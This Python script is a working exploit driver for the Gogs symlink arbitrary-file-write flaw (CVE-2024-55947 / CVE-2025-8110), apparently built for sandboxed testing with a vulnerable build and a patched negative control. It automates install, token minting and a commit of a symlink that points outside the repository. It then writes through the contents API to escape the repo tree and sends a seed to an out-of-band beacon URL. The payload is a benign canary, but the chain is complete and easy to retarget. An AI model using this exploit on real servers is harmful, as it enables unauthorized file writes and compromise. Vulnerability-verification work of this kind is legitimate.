#!/usr/bin/env python3
# =============================================================================
# INTRINSIC-BEACON proof-of-effect driver for CVE-2024-55947 / CVE-2025-8110
# (Gogs symlink arbitrary file write via internal/db.UpdateRepoFile).
#
# Ported from the effect-trial poe_driver_retry.py (the retry-write-through
# variant that FIRED live), converted from a sentinel READ-BACK oracle to an
# INTRINSIC $TEGRON_OOB_URL BEACON that mirrors the GO-2021-0113-liveness
# beaconCanary pattern (ferralon-assay/.../GO-2021-0113-liveness/main.go:72).
#
# SIGNAL SOUNDNESS. The beacon is intrinsic to the escaped write: it is emitted
# from EXACTLY ONE place — after the per-trial canary bytes are CONFIRMED present
# at the out-of-repo sentinel path (i.e. the symlink was followed and the write
# escaped the repository working tree). It reads the sandbox-planted per-run seed
# (/tmp/tegron_canary) and GETs $TEGRON_OOB_URL?data=<seed>, so the observer's
# secret-gated OOB callback (sandbox.go:117-120,140) fires IFF the out-of-repo
# write succeeded.
#
# HTTP-500 IS EXCLUDED. The contents-API PUT can return HTTP 500 on BOTH the
# vulnerable (v0.13.0) and the patched (v0.13.4) build, so the API status is
# NEVER the signal. Only the discriminating out-of-repo sentinel write beacons.
# On v0.13.4 the full-hierarchy symlink guard refuses the escape, the sentinel
# stays absent, the confirmation check never passes, and NO beacon is emitted
# -> the negative-control trace stays dark (PoNE).
#
# It writes ONLY a benign, random per-trial canary. No executable payload, no git
# hook, no authorized_keys — the EFFECT (the out-of-repo write), never the
# weaponization.
# =============================================================================
import argparse
import base64
import http.cookiejar
import json
import os
import re
import secrets
import subprocess
import sys
import tempfile
import time
import urllib.parse
import urllib.request
import urllib.error

SENTINEL_DIR = "/srv/sentinel"            # out-of-repo target dir (created in the Dockerfile)
SENTINEL_NAME = "poe.txt"                 # the out-of-repo file the canary lands in
SYMLINK_IN_REPO = "link"                  # the committed symlink path inside the repo

# The sandbox plants the per-run OOB secret at this path (docker.go:86 seeds it via
# `printf`; the same seed the observer gates on). The intrinsic beacon exfils THIS
# seed to $TEGRON_OOB_URL, byte-for-byte the GO-2021-0113-liveness channel.
CANARY_SEED_PATH = "/tmp/tegron_canary"


def log(msg):
    """Step trace to stdout (captured by the exec-diag) so any provisioning stall
    is localizable without another blind trial. Never affects the firing signal."""
    print("[beacon] " + msg, flush=True)


def _req(method, url, token=None, body=None, headers=None, basic=None):
    data = None
    hdrs = dict(headers or {})
    if body is not None:
        data = json.dumps(body).encode()
        hdrs["Content-Type"] = "application/json"
    if token:
        hdrs["Authorization"] = "token " + token
    if basic:
        raw = ("%s:%s" % basic).encode()
        hdrs["Authorization"] = "Basic " + base64.b64encode(raw).decode()
    r = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(r) as resp:
            raw = resp.read()
            # A 2xx body is not guaranteed to be JSON: right after /install gogs
            # reloads config and can serve a non-JSON page on the API surface. Never
            # let a non-JSON 2xx body raise — return the raw text so callers retry.
            if not raw:
                return resp.status, None
            try:
                return resp.status, json.loads(raw)
            except ValueError:
                return resp.status, raw.decode(errors="replace")
    except urllib.error.HTTPError as e:
        raw = e.read()
        try:
            return e.code, json.loads(raw) if raw else None
        except Exception:
            return e.code, raw.decode(errors="replace")


def wait_up(base, timeout=60):
    """Poll the Gogs HTTP endpoint until it answers (server boot can lag)."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(base, timeout=3) as resp:
                if resp.status < 500:
                    return True
        except urllib.error.HTTPError:
            return True  # any HTTP response means the server is serving
        except Exception:
            time.sleep(1)
    return False


def install(base, admin_user, admin_pass, admin_email):
    """Drive the Gogs first-run /install form (idempotent: a 2nd POST is a no-op
    once configured). SQLite keeps the reproducer self-contained and offline.

    gogs protects the install form with go-macaron CSRF: it sets a `_csrf` cookie on
    GET /install and renders a matching hidden `_csrf` field; a POST lacking either
    is rejected and the install page is re-rendered (HTTP 200, no redirect) so the
    server stays uninstalled. We therefore GET first (shared cookie jar), carry the
    `_csrf` token into the POST, and log the post-redirect URL to confirm it took."""
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    try:
        with opener.open(base + "/install", timeout=30) as resp:
            html = resp.read().decode(errors="replace")
    except Exception as ex:
        log("install: GET /install failed: %s" % ex)
        html = ""
    # gogs 0.13 emits the token as <meta name="_csrf" content="..."> (used for the
    # X-Csrf-Token header) and/or a hidden <input name="_csrf" value="...">. Accept
    # either attribute form; the same token validates against the _csrf cookie.
    m = re.search(r'name="_csrf"\s+(?:content|value)="([^"]+)"', html)
    csrf = m.group(1) if m else ""
    log("install: csrf token %s" % ("acquired" if csrf else "MISSING"))
    form = {
        "db_type": "SQLite3",
        "db_path": "data/gogs.db",
        "app_name": "Gogs",
        "repo_root_path": "/home/git/gogs-repositories",
        "run_user": "git",
        "domain": "localhost",
        "ssh_port": "22",
        "http_port": "3000",
        "app_url": base + "/",
        "log_root_path": "/home/git/log",
        "admin_name": admin_user,
        "admin_passwd": admin_pass,
        "admin_confirm_passwd": admin_pass,
        "admin_email": admin_email,
        "_csrf": csrf,
    }
    data = urllib.parse.urlencode(form).encode()
    r = urllib.request.Request(
        base + "/install", data=data, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded",
                 "X-Csrf-Token": csrf},
    )
    try:
        with opener.open(r, timeout=90) as resp:
            # Success redirects off /install (to / or /user/login); a body still on
            # /install means the form was rejected (validation / csrf).
            landed = resp.geturl()
            log("install: POST -> HTTP %s landed=%s" % (resp.status, landed))
    except urllib.error.HTTPError as e:
        # A 3xx after a successful install can surface here; treat non-error as OK.
        log("install: POST -> HTTP %s (redirect/err)" % e.code)
    except Exception as ex:
        log("install: POST failed: %s" % ex)


def wait_ready(base, user, password, timeout=120):
    """After /install, gogs reloads its config (Console -> File logging) and the
    authenticated API is briefly unavailable. Poll the token-list surface with the
    admin basic-auth creds until it answers 200 with a JSON body — proof the server
    finished reloading AND the admin account exists — before any provisioning."""
    deadline = time.time() + timeout
    attempt = 0
    while time.time() < deadline:
        attempt += 1
        status, body = _req(
            "GET", "%s/api/v1/users/%s/tokens" % (base, user), basic=(user, password),
        )
        if status == 200 and isinstance(body, (list, dict)):
            log("api ready after %d attempt(s)" % attempt)
            return True
        prefix = (body if isinstance(body, str) else json.dumps(body))[:160] \
            if body is not None else "<empty>"
        log("api not ready (attempt %d): HTTP %s body=%r" % (attempt, status, prefix))
        time.sleep(3)
    return False


def make_token(base, user, password, attempts=10):
    """Mint an API token via basic auth (the documented /api/v1 tokens surface).
    Bounded-retry: even after wait_ready, the first token POST can race the reload
    and return a transient non-dict body. Retrying never fabricates a signal — the
    token is only a provisioning credential, not the firing discriminator."""
    last = (None, None)
    for i in range(attempts):
        status, body = _req(
            "POST", "%s/api/v1/users/%s/tokens" % (base, user),
            basic=(user, password), body={"name": "poe-%s" % secrets.token_hex(4)},
        )
        if isinstance(body, dict) and body.get("sha1"):
            log("token minted (attempt %d)" % (i + 1))
            return body["sha1"]
        last = (status, body)
        log("token mint retry %d: HTTP %s" % (i + 1, status))
        time.sleep(3)
    raise SystemExit("could not mint API token after %d attempts: HTTP %s %r"
                     % (attempts, last[0], last[1]))


def create_repo(base, token, repo):
    _req("POST", base + "/api/v1/user/repos", token=token,
         body={"name": repo, "auto_init": False, "private": False})


def commit_symlink(base, user, password, repo):
    """Clone the repo over HTTP, add a symlink that points OUTSIDE the repo, and
    push it. This is plain git — committing a symlink is a normal, allowed
    operation; the vulnerability is that the server later *follows* it on write."""
    creds = "%s:%s" % (urllib.parse.quote(user), urllib.parse.quote(password))
    parsed = urllib.parse.urlparse(base)
    clone_url = "%s://%s@%s/%s/%s.git" % (parsed.scheme, creds, parsed.netloc, user, repo)
    with tempfile.TemporaryDirectory() as tmp:
        subprocess.run(["git", "clone", clone_url, tmp], check=True)
        link_path = os.path.join(tmp, SYMLINK_IN_REPO)
        # Symlink -> the out-of-repo sentinel directory. Writing to "<link>/<file>"
        # therefore resolves to "<sentinel-dir>/<file>", outside the repo tree.
        os.symlink(SENTINEL_DIR, link_path)
        env = dict(os.environ,
                   GIT_AUTHOR_NAME="poe", GIT_AUTHOR_EMAIL="poe@example.invalid",
                   GIT_COMMITTER_NAME="poe", GIT_COMMITTER_EMAIL="poe@example.invalid")
        subprocess.run(["git", "-C", tmp, "add", SYMLINK_IN_REPO], check=True, env=env)
        subprocess.run(["git", "-C", tmp, "commit", "-m", "add link"], check=True, env=env)
        subprocess.run(["git", "-C", tmp, "push", "origin", "HEAD"], check=True, env=env)


def write_through(base, token, user, repo, token_bytes):
    """Call the contents API to write a benign canary THROUGH the committed
    symlink. Path "<link>/<sentinel-name>" resolves outside the repo; on a
    vulnerable build the server follows it and writes to the sentinel. Returns the
    HTTP status ONLY for logging — it is deliberately never used as the signal."""
    path = "%s/%s" % (SYMLINK_IN_REPO, SENTINEL_NAME)
    url = "%s/api/v1/repos/%s/%s/contents/%s" % (base, user, repo, path)
    body = {
        "message": "poe",
        "content": base64.b64encode(token_bytes).decode(),
        "branch": "master",
    }
    status, resp = _req("PUT", url, token=token, body=body)
    return status, resp


def sentinel_has(sentinel, canary):
    """True IFF the per-trial canary bytes are present at the out-of-repo sentinel
    path — i.e. the write escaped the repository working tree. This is the SOLE
    discriminator between the vulnerable and patched build."""
    try:
        with open(sentinel, "rb") as f:
            return canary in f.read()
    except FileNotFoundError:
        return False


def beacon_escape():
    """Intrinsic exploit beacon. Invoked ONLY from the confirmed-escape path, so
    reaching it is proof the out-of-repo write succeeded. Reads the sandbox-planted
    per-run seed and GETs $TEGRON_OOB_URL?data=<seed> — byte-for-byte the
    GO-2021-0113-liveness beaconCanary channel. Returns False (dark) if the OOB
    env / seed are absent so a mis-provisioned run never false-fires."""
    oob = os.getenv("TEGRON_OOB_URL")
    if not oob:
        return False
    try:
        with open(CANARY_SEED_PATH, "rb") as f:
            seed = f.read()
    except FileNotFoundError:
        return False
    try:
        with urllib.request.urlopen(oob + "?data=" + urllib.parse.quote(seed), timeout=10) as resp:
            resp.read()
    except Exception:
        # A failed beacon is dark, not fatal — the observer simply records no signal.
        return False
    return True


def main():
    ap = argparse.ArgumentParser(description="Intrinsic-beacon Gogs symlink-write PoE driver")
    ap.add_argument("--base", default="http://localhost:3000", help="Gogs base URL")
    # NB: "admin" is a gogs-reserved username (install rejects it with
    # "name is not allowed: reserved"), so the provisioning account is "poeadmin".
    ap.add_argument("--user", default="poeadmin")
    ap.add_argument("--password", default="poeadmin12345")
    ap.add_argument("--email", default="admin@example.invalid")
    ap.add_argument("--repo", default="poe")
    ap.add_argument("--sentinel", default=os.path.join(SENTINEL_DIR, SENTINEL_NAME),
                    help="out-of-repo sentinel path the canary must NOT reach on a fixed build")
    args = ap.parse_args()

    # Per-trial canary: a fresh random token so the sentinel confirmation matches
    # THIS trial's write and never a stale artifact from a previous run. (Distinct
    # from the sandbox-planted OOB seed the beacon exfils.)
    canary = ("tegron-poe-%s" % secrets.token_hex(16)).encode()

    log("waiting for gogs http to come up at %s" % args.base)
    if not wait_up(args.base):
        raise SystemExit("gogs did not come up at %s" % args.base)

    log("gogs up; posting /install")
    install(args.base, args.user, args.password, args.email)
    log("install posted; waiting for authenticated api readiness")
    if not wait_ready(args.base, args.user, args.password):
        raise SystemExit("gogs api not ready after install")
    token = make_token(args.base, args.user, args.password)
    log("creating repo %s" % args.repo)
    create_repo(args.base, token, args.repo)
    log("cloning + committing out-of-repo symlink")
    commit_symlink(args.base, args.user, args.password, args.repo)

    # Retry write-through: the DB migration settle can lag the first PUT, so retry
    # up to 8x/2s (the timing that fired live; gogs-dark-control-harness-recipe).
    # We keep writing until the out-of-repo sentinel confirms the escape.
    log("write-through loop begins (<=8x/2s)")
    status = None
    fired = False
    for _i in range(8):
        time.sleep(2)
        status, _ = write_through(args.base, token, args.user, args.repo, canary)
        fired = sentinel_has(args.sentinel, canary)
        log("write-through attempt %d: api_status=%s sentinel_write=%s"
            % (_i + 1, status, fired))
        if fired:
            break

    beaconed = False
    if fired:
        # ONLY the confirmed out-of-repo write beacons. HTTP-500 (which occurs on
        # both builds) is never the signal.
        beaconed = beacon_escape()

    record = {
        "observable": "out_of_repo_file_write",
        "sentinel": args.sentinel,
        "fired": fired,
        "beaconed": beaconed,
        "api_status": status,
    }
    print(json.dumps(record))
    # Exit 0 = escape confirmed (positive control fired); exit 3 = dark (PoNE).
    sys.exit(0 if fired else 3)


if __name__ == "__main__":
    main()
